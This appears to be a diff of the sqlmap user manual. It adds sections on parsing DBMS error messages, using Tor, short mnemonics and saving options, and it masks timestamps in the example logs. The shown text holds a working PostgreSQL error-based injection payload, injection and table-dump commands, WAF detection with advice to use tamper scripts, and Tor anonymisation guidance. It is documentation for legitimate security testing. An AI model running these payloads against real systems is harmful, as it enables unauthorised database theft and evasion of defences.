-    [20:01:14] [PAYLOAD] 1 AND 5849=CAST((CHR(58)||CHR(118)||CHR(116)||CHR(106)||CHR(58))||(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION() AS CHARACTER(10000)),(CHR(32)))),(CHR(85)||CHR(84)||CHR(70)||CHR(56))),(CHR(72)||CHR(69)||CHR(88))))::text||(CHR(58)||CHR(110)||CHR(120)||CHR(98)||CHR(58)) AS NUMERIC)
-    [20:01:15] [INFO] parsed error message: 'pg_query() [<a href='function.pg-query'>function.pg-query</a>]: Query failed: ERROR:  invalid input syntax for type numeric: ":vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c202844656269616e2032e332e322d312e312920342e332e32:nxb:" in <b>/var/www/sqlmap/libs/pgsql.inc.php</b> on line <b>35</b>'
-    [20:01:15] [INFO] retrieved: PostgreSQL 8.3.9 on i486-pc-linux-gnu, compiled by
+    [xx:xx:14] [INFO] fetching banner
+    [xx:xx:14] [PAYLOAD] 1 AND 5849=CAST((CHR(58)||CHR(118)||CHR(116)||CHR(106)||CHR(58))||(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION() AS CHARACTER(10000)),(CHR(32)))),(CHR(85)||CHR(84)||CHR(70)||CHR(56))),(CHR(72)||CHR(69)||CHR(88))))::text||(CHR(58)||CHR(110)||CHR(120)||CHR(98)||CHR(58)) AS NUMERIC)
+    [xx:xx:15] [INFO] parsed error message: 'pg_query() [<a href='function.pg-query'>function.pg-query</a>]: Query failed: ERROR:  invalid input syntax for type numeric: ":vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c202844656269616e2032e332e322d312e312920342e332e32:nxb:" in <b>/var/www/sqlmap/libs/pgsql.inc.php</b> on line <b>35</b>'
+    [xx:xx:15] [INFO] retrieved: PostgreSQL 8.3.9 on i486-pc-linux-gnu, compiled by
     GCC gcc-4.3.real (Debian 4.3.2-1.1) 4.3.2
     [...]
 
@@ -1756,6 +1770,47 @@ Switch: `--save`
 
 It is possible to save the command line options to a configuration INI file. The generated file can then be edited and passed to sqlmap with the `-c` option as explained above. 
 
+### Parse DBMS error messages from response pages
+
+Switch: `--parse-errors`
+
+If the web application is configured in debug mode so that it displays in the HTTP responses the back-end database management system error messages, sqlmap can parse and display them for you.
+
+This is useful for debugging purposes like understanding why a certain enumeration or takeover switch does not work - it might be a matter of session user's privileges and in this case you would see a DBMS error message along the lines of `Access denied for user  <SESSION USER>`. 
+
+Example against a Microsoft SQL Server target:
+
+    $ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" -z "ign,flu,tec=U" --parse-errors
+    [...]
+    [xx:xx:17] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+    [xx:xx:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)
+    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 10 is out of range of the number of items in the select list.
+    <b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
+    [xx:xx:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)
+    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 6 is out of range of the number of items in the select list.
+    <b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
+    [xx:xx:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)
+    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is out of range of the number of items in the select list.
+    <b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
+    [xx:xx:17] [INFO] target URL appears to have 3 columns in query
+    [...]
+
+### Save options in a configuration INI file
+
+Switch: `--save`
+
+It is possible to save the command line options to a configuration INI file. The generated file can then be edited and passed to sqlmap with the `-c` option as explained above.
+
+### Tor anonymity network
+
+Switches and options: `--tor`, `--tor-port`, `--tor-type` and `--check-tor`
+
+If, for any reason, you need to stay anonymous, instead of passing by a single predefined HTTP(S) proxy server, you can configure a [Tor client](http://www.torproject.org/) together with [Privoxy](http://www.privoxy.org) (or similar) on your machine as explained in [Tor installation guides](https://www.torproject.org/docs/installguide.html.en). Then you can use a switch `--tor` and sqlmap will try to automatically set Tor proxy connection settings.
+
+In case that you want to manually set the type and port of used Tor proxy, you can do it with options `--tor-type` and `--tor-port` (e.g. `--tor-type=SOCKS5 --tor-port 9050`).
+
+You are strongly advised to use `--check-tor` occasionally to be sure that everything was set up properly. There are cases when Tor bundles (e.g. Vidalia) come misconfigured (or reset previously set configuration) giving you a false sense of anonymity. Using this switch sqlmap will check that everything works as expected by sending a single request to an official [Are you using Tor?](https://check.torproject.org/) page before any target requests. In case that check fails, sqlmap will warn you and abruptly exit.
+
 ### Update sqlmap
 
 Switch: `--update`
@@ -1768,17 +1823,33 @@ This is strongly recommended **before** reporting any bug to the [mailing lists]
 
 ## Miscellaneous
 
-### Short mnemonics
+### Use short mnemonics
 
 Option: `-z`
 
-**TODO**: needs updating.
+It could become tedious to type all desired options and switches, especially for those that are used most often (e.g. `--batch --random-agent --ignore-proxy --technique=BEU`). There is a simpler and much shorter way how to deal with that problem. In sqlmap it's called "mnemonics".
+
+Each option and switch can be written in a shorter mnemonic form using option `-z`, separated with a comma character (`,`), where mnemonics represent only the first arbitrarily chosen part of the original name. There is no strict mapping of options and switches to their respective shortened counterparts. Only required condition is that there is no other option nor switch that has a same prefix as the desired one.
+
+Example:
+
+    python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u "www.target.com/vuln.php?id=1"
+
+can be written (one of many ways) in shorter mnemonic form like:
+
+    python sqlmap.py -z "bat,randoma,ign,tec=BEU" -u "www.target.com/vuln.php?id=1"
+
+Another example:
+
+    python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u "www.target.com/vuln.php?id=1"
+
+can be written in shorter mnemonic form like:
+
+    python sqlmap.py -z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u "www.target.com/vuln.php?id=1"
 
 ### Alerting on successful SQL injection detection
 
 Option: `--alert`
-
-**TODO**: needs updating.
 
 ### Set answers for questions
 
@@ -1790,9 +1861,9 @@ Example against a MySQL target:
 
     $ python sqlmap.py -u "http://192.168.22.128/sqlmap/mysql/get_int.php?id=1"--technique=E --answers="extending=N" --batch
     [...]
-    [21:58:56] [INFO] testing for SQL injection on GET parameter 'id'
+    [xx:xx:56] [INFO] testing for SQL injection on GET parameter 'id'
     heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
-    [21:58:56] [INFO] do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] N
+    [xx:xx:56] [INFO] do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] N
     [...]
 
 ### Make a beep sound when SQL injection is found
@@ -1829,7 +1900,7 @@ sqlmap by default uses coloring while writting to console. In case of undesired 
 
 Option: `--gpage`
 
-Default sqlmap behavior with option `-g` is to do a Google search and use the first 100 resulting URLs for further SQL injection testing. However, in combination with this option you can specify with this switch, `--gpage`, some page other than the first one to retrieve target URLs from. 
+Default sqlmap behavior with option `-g` is to do a Google search and use the first 100 resulting URLs for further SQL injection testing. However, in combination with this option you can specify with this option (`--gpage`) a page other than the first one to retrieve target URLs from. 
 
 ### Use HTTP parameter pollution
 
@@ -1847,31 +1918,31 @@ Example against a MySQL target protected by the ModSecurity WAF:
 
     $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --identify-waf -v 3
     [...]
-    [11:35:23] [INFO] testing connection to the target URL
-    [11:35:23] [INFO] heuristics detected web page charset 'ascii'
-    [11:35:23] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'USP Secure Entry Server (United Security Providers)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'BinarySEC Web Application Firewall (BinarySEC)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'NetContinuum Web Application Firewall (NetContinuum/Barracuda Networks)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'Hyperguard Web Application Firewall (art of defence Inc.)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'Cisco ACE XML Gateway (Cisco Systems)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'TrafficShield (F5 Networks)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'Teros/Citrix Application Firewall Enterprise (Teros/Citrix Systems)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'KONA Security Solutions (Akamai Technologies)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'Incapsula Web Application Firewall (Incapsula/Imperva)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'CloudFlare Web Application Firewall (CloudFlare)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'Barracuda Web Application Firewall (Barracuda Networks)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'webApp.secure (webScurity)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'Proventia Web Application Security (IBM)'
-    [11:35:23] [DEBUG] declared web page charset 'iso-8859-1'
-    [11:35:23] [DEBUG] page not found (404)
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'KS-WAF (Knownsec)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'NetScaler (Citrix Systems)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'Jiasule Web Application Firewall (Jiasule)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'WebKnight Application Firewall (AQTRONIX)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'AppWall (Radware)'
-    [11:35:23] [DEBUG] checking for WAF/IDS/IPS product 'ModSecurity: Open Source Web Application Firewall (Trustwave)'
-    [11:35:23] [CRITICAL] WAF/IDS/IPS identified 'ModSecurity: Open Source Web Application Firewall (Trustwave)'. Please consider usage of tamper scripts (option '--tamper')
+    [xx:xx:23] [INFO] testing connection to the target URL
+    [xx:xx:23] [INFO] heuristics detected web page charset 'ascii'
+    [xx:xx:23] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'USP Secure Entry Server (United Security Providers)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'BinarySEC Web Application Firewall (BinarySEC)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetContinuum Web Application Firewall (NetContinuum/Barracuda Networks)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Hyperguard Web Application Firewall (art of defence Inc.)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Cisco ACE XML Gateway (Cisco Systems)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'TrafficShield (F5 Networks)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Teros/Citrix Application Firewall Enterprise (Teros/Citrix Systems)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KONA Security Solutions (Akamai Technologies)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Incapsula Web Application Firewall (Incapsula/Imperva)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'CloudFlare Web Application Firewall (CloudFlare)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Barracuda Web Application Firewall (Barracuda Networks)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'webApp.secure (webScurity)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Proventia Web Application Security (IBM)'
+    [xx:xx:23] [DEBUG] declared web page charset 'iso-8859-1'
+    [xx:xx:23] [DEBUG] page not found (404)
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KS-WAF (Knownsec)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetScaler (Citrix Systems)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Jiasule Web Application Firewall (Jiasule)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'WebKnight Application Firewall (AQTRONIX)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'AppWall (Radware)'
+    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'ModSecurity: Open Source Web Application Firewall (Trustwave)'
+    [xx:xx:23] [CRITICAL] WAF/IDS/IPS identified 'ModSecurity: Open Source Web Application Firewall (Trustwave)'. Please consider usage of tamper scripts (option '--tamper')
     [...]
 
 ### Imitate smartphone
@@ -1911,13 +1982,13 @@ Example run:
 
     $ python sqlmap.py --purge-output -v 3
     [...]
-    [11:38:55] [INFO] purging content of directory '/home/user/sqlmap/output'...
-    [11:38:55] [DEBUG] changing file attributes
-    [11:38:55] [DEBUG] writing random data to files
-    [11:38:55] [DEBUG] truncating files
-    [11:38:55] [DEBUG] renaming filenames to random values
-    [11:38:55] [DEBUG] renaming directory names to random values
-    [11:38:55] [DEBUG] deleting the whole directory tree
+    [xx:xx:55] [INFO] purging content of directory '/home/user/sqlmap/output'...
+    [xx:xx:55] [DEBUG] changing file attributes
+    [xx:xx:55] [DEBUG] writing random data to files
+    [xx:xx:55] [DEBUG] truncating files
+    [xx:xx:55] [DEBUG] renaming filenames to random values
+    [xx:xx:55] [DEBUG] renaming directory names to random values
+    [xx:xx:55] [DEBUG] deleting the whole directory tree
     [...]
 
 ### Conduct through tests only if positive heuristic(s)
@@ -1930,36 +2001,36 @@ Example against a MySQL target:
 
     $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&user=foo&id=1" --batch --smart
     [...]
-    [16:12:14] [INFO] testing if GET parameter 'ca' is dynamic
-    [16:12:14] [WARNING] GET parameter 'ca' does not appear dynamic
-    [16:12:14] [WARNING] heuristic (basic) test shows that GET parameter 'ca' might not be injectable
-    [16:12:14] [INFO] skipping GET parameter 'ca'
-    [16:12:14] [INFO] testing if GET parameter 'user' is dynamic
-    [16:12:14] [WARNING] GET parameter 'user' does not appear dynamic
-    [16:12:14] [WARNING] heuristic (basic) test shows that GET parameter 'user' might not be injectable
-    [16:12:14] [INFO] skipping GET parameter 'user'
-    [16:12:14] [INFO] testing if GET parameter 'id' is dynamic
-    [16:12:14] [INFO] confirming that GET parameter 'id' is dynamic
-    [16:12:14] [INFO] GET parameter 'id' is dynamic
-    [16:12:14] [WARNING] reflective value(s) found and filtering out
-    [16:12:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
-    [16:12:14] [INFO] testing for SQL injection on GET parameter 'id'
+    [xx:xx:14] [INFO] testing if GET parameter 'ca' is dynamic
+    [xx:xx:14] [WARNING] GET parameter 'ca' does not appear dynamic
+    [xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'ca' might not be injectable
+    [xx:xx:14] [INFO] skipping GET parameter 'ca'
+    [xx:xx:14] [INFO] testing if GET parameter 'user' is dynamic
+    [xx:xx:14] [WARNING] GET parameter 'user' does not appear dynamic
+    [xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'user' might not be injectable
+    [xx:xx:14] [INFO] skipping GET parameter 'user'
+    [xx:xx:14] [INFO] testing if GET parameter 'id' is dynamic
+    [xx:xx:14] [INFO] confirming that GET parameter 'id' is dynamic
+    [xx:xx:14] [INFO] GET parameter 'id' is dynamic
+    [xx:xx:14] [WARNING] reflective value(s) found and filtering out
+    [xx:xx:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+    [xx:xx:14] [INFO] testing for SQL injection on GET parameter 'id'
     heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
     do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] Y
-    [16:12:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-    [16:12:14] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable 
-    [16:12:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
-    [16:12:14] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause' injectable 
-    [16:12:14] [INFO] testing 'MySQL inline queries'
-    [16:12:14] [INFO] testing 'MySQL > 5.0.11 stacked queries'
-    [16:12:14] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
-    [16:12:14] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
-    [16:12:24] [INFO] GET parameter 'id' is 'MySQL > 5.0.11 AND time-based blind' injectable 
-    [16:12:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
-    [16:12:24] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other potential injection technique found
-    [16:12:24] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
-    [16:12:24] [INFO] target URL appears to have 3 columns in query
-    [16:12:24] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+    [xx:xx:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+    [xx:xx:14] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+    [xx:xx:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
+    [xx:xx:14] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause' injectable 
+    [xx:xx:14] [INFO] testing 'MySQL inline queries'
+    [xx:xx:14] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+    [xx:xx:14] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+    [xx:xx:14] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
+    [xx:xx:24] [INFO] GET parameter 'id' is 'MySQL > 5.0.11 AND time-based blind' injectable 
+    [xx:xx:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+    [xx:xx:24] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other potential injection technique found
+    [xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+    [xx:xx:24] [INFO] target URL appears to have 3 columns in query
+    [xx:xx:24] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
     [...]
 
 ### Select tests by payloads and/or titles
@@ -1972,12 +2043,12 @@ Example against a MySQL target:
 
     $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --batch --test-filter=ROW
     [...]
-    [16:16:39] [INFO] GET parameter 'id' is dynamic
-    [16:16:39] [WARNING] reflective value(s) found and filtering out
-    [16:16:39] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
-    [16:16:39] [INFO] testing for SQL injection on GET parameter 'id'
-    [16:16:39] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause'
-    [16:16:39] [INFO] GET parameter 'id' is 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause' injectable 
+    [xx:xx:39] [INFO] GET parameter 'id' is dynamic
+    [xx:xx:39] [WARNING] reflective value(s) found and filtering out
+    [xx:xx:39] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+    [xx:xx:39] [INFO] testing for SQL injection on GET parameter 'id'
+    [xx:xx:39] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause'
+    [xx:xx:39] [INFO] GET parameter 'id' is 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause' injectable 
     GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
     sqlmap identified the following injection points with a total of 3 HTTP(s) requests:
     ---
